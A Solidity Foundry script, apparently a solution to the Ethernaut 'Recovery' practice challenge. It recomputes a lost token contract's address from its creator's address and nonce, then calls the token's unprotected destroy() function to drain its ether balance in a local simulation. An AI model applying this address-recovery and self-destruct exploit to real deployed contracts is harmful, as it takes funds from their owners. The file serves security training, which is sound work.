// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "forge-std/Script.sol";
import "../src/Recovery.sol";

contract RecoveryHack is Script {
    Recovery recovery;
    address public tokenAddr;

    function run() public {
        vm.startPrank(address(1024));
        recovery = new Recovery();
        recovery.generateToken("InitialToken", uint256(100_000));
        vm.stopPrank();
        // calculate the lost address: address = rightmost_20_bytes(keccak(RLP(sender address ,nonce)))
        tokenAddr = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            uint8(0xd6), // 0xc0 + 0x16 (22 = 1 + 20 + 1)
                            uint8(0x94), // 0x80 + 0x14 (20)
                            address(recovery), // 20 bytes
                            uint8(0x01) // one byte
                        )
                    )
                )
            )
        );
        vm.deal(tokenAddr, 0.001 ether);
        SimpleToken simpleToken = SimpleToken(payable(tokenAddr));
        // ensure the contract address is correct
        console.log(simpleToken.balances(address(1024)));
        console.log("Before:", tokenAddr.balance);
        simpleToken.destroy(payable(address(0)));
        // check the attack is success or not
        console.log("After:", tokenAddr.balance);
    }
}
